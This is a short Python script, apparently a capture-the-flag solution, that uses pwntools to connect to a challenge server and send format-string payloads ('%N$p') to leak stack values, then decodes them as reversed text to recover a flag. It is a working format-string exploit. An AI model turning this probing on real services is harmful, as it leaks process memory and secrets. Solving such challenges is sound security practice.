#!python3
from pwn import *

for i in range(1,50):
    #connect nc 0.cloud.chals.io 12690
    r = remote('0.cloud.chals.io', 12690)
    r.recv()
    r.sendline(b'%'+str(i).encode()+b'$p')
    a = r.recv().decode()[48:61]
    print(a)
    try:
        print(bytearray.fromhex(a).decode()[::-1])
    except:
        next

    r.close()